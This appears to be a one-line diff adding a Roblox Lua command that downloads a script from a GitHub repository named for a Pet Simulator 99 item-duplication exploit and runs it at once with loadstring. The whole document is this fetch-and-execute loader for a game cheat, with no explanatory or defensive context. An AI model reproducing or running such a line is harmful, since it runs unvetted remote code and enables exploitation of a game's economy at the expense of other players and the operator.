@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tientri182/Pet99Dupe/main/Dupe"))()
